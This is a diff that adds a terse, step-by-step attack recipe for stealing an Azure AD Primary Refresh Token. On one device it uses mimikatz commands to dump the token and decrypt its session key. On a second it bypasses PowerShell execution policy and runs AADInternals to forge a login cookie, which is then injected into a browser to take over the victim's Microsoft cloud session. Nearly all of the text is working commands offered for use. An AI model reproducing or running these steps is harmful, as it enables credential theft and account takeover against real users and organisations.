@@ -1,0 +1,33 @@
+#requirements device1:
+-make sure device is azure-joined (dsregcmd /status)
+-make sure your're logged in with azure ad account
+-start mimikatz (localadmin required)
+
+#commands device1:
+privilege::debug
+sekurlsa::cloudap
+[copy Prt and KeyValue]
+token::elevate
+dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect
+[copy ClearKey]
+
+#requirements device2
+-download module 'AADInternals' from https://github.com/Gerenios/AADInternals
+-start Powershell, navigate to AADInternals-directory
+-recommanded: Google Chrome or MS Edge Browser installed
+-ClearKey and Prt from device1 is required in order to generate a valid cookie
+
+#commands device2:
+powershell -ep bypass
+Import-Module .\AADInternals.psd1
+$PRT_OF_USER = '<Prt>'
+while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
+$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
+$ClearKey = "<ClearKey>"
+$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
+New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
+[copy generated value, open 'login.microsoftonline.com' in chrome or edge, right-click select inspect, switch to "applications"-tab, delete all cookies, add the following:]
+Name: x-ms-RefreshTokenCredential
+Value: <GeneratedValue>
+[Check on 'http-only'-option for created cookie]
+[refresh page]
